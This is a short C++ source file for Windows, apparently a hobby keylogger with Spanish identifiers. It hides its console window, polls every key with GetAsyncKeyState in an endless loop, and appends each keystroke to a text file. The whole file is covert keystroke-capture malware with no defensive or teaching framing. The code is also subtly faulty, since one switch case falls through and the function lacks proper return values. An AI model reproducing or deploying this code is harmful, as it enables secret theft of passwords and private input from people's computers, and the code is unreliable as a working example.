#include <iostream>
#include <fstream>
#include <Windows.h>
#include <string>
#include <stdio.h>

using namespace std;

void EscribirArchivo(LPCSTR texto) {
	ofstream archivo;
	archivo.open("texto.txt", fstream::app);
	archivo << texto;
	archivo.close();
}
bool teclaspulsadas(int tecla) {
	switch (tecla)
	{
	case VK_SPACE:
		cout << " ";
		EscribirArchivo(" ");
		break;
	case VK_ESCAPE:
		cout << "[ESCAPE]";
		EscribirArchivo("[ESCAPE]");
		break;
	case VK_UP:
		cout << "[UP]";
		EscribirArchivo("[UP]");
	default: return false;
		break;
	}
	//TECLAS
}
int main() {
	FreeConsole();
	unsigned char key;
	while (TRUE) {
		for (key = 8; key <= 255; key++)
		{
			
			if (GetAsyncKeyState(key) == -32767) {
				if (teclaspulsadas(key) == false) {
					cout << key;
					ofstream archivo;
					archivo.open("texto.txt", fstream::app);
					archivo << key;
					archivo.close();
				}
			}

		}
	}
}
